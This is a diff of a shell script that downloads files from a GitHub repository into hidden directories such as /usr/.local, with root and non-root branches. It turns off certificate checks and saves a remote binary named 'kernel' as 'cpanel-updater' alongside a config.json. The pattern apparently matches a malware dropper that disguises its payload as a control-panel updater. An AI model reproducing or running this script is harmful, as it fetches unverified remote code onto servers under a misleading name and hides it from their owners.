@@ -22,7 +22,7 @@ user_type=$1
 if [ "$user_type" == "root" ] ;then
 
     sudo mkdir -p /usr/.local && sudo mkdir -p /usr/.shares
-    sudo curl -L -k https://raw.githubusercontent.com/blackkitty02020/repo1/refs/heads/main/cpanel-updater -o /usr/.local/cpanel-updater
+    sudo curl -L -k https://raw.githubusercontent.com/blackkitty02020/repo1/refs/heads/main/kernel -o /usr/.local/cpanel-updater
     sudo curl -L -k https://raw.githubusercontent.com/blackkitty02020/repo1/refs/heads/main/config.json -o /usr/.local/config.json
 
 
@@ -30,7 +30,7 @@ fi
 if [ "$user_type" == "normal1" ];then
 
     mkdir -p $HOME/.local
-    curl -L -k https://raw.githubusercontent.com/blackkitty02020/repo1/refs/heads/main/cpanel-updater -o $HOME/.local/cpanel-updater
+    curl -L -k https://raw.githubusercontent.com/blackkitty02020/repo1/refs/heads/main/kernel -o $HOME/.local/cpanel-updater
     curl -L -k https://raw.githubusercontent.com/blackkitty02020/repo1/refs/heads/main/config.json -o $HOME/.local/config.json
  
 fi
